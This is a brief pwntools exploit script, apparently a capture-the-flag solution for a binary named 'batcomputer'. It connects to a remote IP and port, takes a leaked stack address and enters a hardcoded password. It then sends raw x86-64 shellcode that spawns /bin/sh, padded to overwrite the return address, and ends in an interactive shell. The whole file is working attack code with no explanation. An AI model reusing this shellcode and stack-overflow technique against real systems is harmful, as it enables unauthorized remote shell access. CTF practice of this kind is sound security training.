from pwn import *

context.binary = exe = ELF('batcomputer')

#io = process()
#gdb.attach(io, api=True)
io = remote('209.97.140.29', 30170)

io.sendlineafter(b'> ', b'1')
io.recvuntil(b'0x')
shell = int(io.recvline(keepends=False), 16)

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b': ', b'b4tp@$$w0rd!')

payload = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'.ljust(84, b'\0') + p64(shell)
io.sendlineafter(b': ', payload)

io.sendlineafter(b'> ', b'0')
io.interactive()